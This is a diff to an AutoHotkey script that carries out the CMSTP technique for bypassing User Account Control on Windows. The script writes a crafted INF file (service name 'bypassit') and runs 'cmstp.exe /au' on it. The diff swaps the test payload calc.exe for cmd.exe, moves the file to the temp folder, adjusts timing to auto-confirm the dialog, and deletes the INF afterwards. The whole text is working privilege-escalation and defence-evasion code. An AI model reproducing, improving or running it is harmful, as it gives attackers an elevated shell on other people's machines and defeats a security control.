@@ -1,11 +1,11 @@
 #Requires AutoHotkey v2.0
 #SingleInstance Force
 
-; Define INF file path
-infPath := "C:\Windows\Tasks\cmstp.ini"
+; Use temp directory instead of Windows directory
+infPath := A_Temp "\cmstp.ini"
 
-; INF file contents
-infContents := "
+; INF file contents with explicit Windows line endings
+infContents := StrReplace("
 (
 [version]
 Signature=$chicago$
@@ -16,7 +16,7 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
  
 [RunPreSetupCommandsSection]
-calc.exe
+cmd.exe
 taskkill /IM cmstp.exe /F
  
 [CustInstDestSectionAllUsers]
@@ -28,20 +28,21 @@ taskkill /IM cmstp.exe /F
 [Strings]
 ServiceName="bypassit"
 ShortSvcName="bypassit"
-)"
+)", "`n", "`r`n")
+
 try {
     ; Write the INF file
     FileAppend(infContents, infPath)
     
-    ; Run CMSTP
-    Run('cmstp.exe /au "' infPath '"', A_WorkingDir)
+    ; Run CMSTP with properly quoted path
+    Run('cmstp.exe /au "' infPath '"', A_WorkingDir, "Max")
     
-    ; Wait for CMSTP window and send Enter
-    Sleep(200)
+    ; Match original timing for dialog interaction
+    Sleep(2000)
     Send("{Enter}")
     
-    ; Wait for CMSTP to process
-    Sleep(1000)
+    ; Allow sufficient time for CMSTP processing
+    Sleep(5000)
     
     ; Clean up
     FileDelete(infPath)
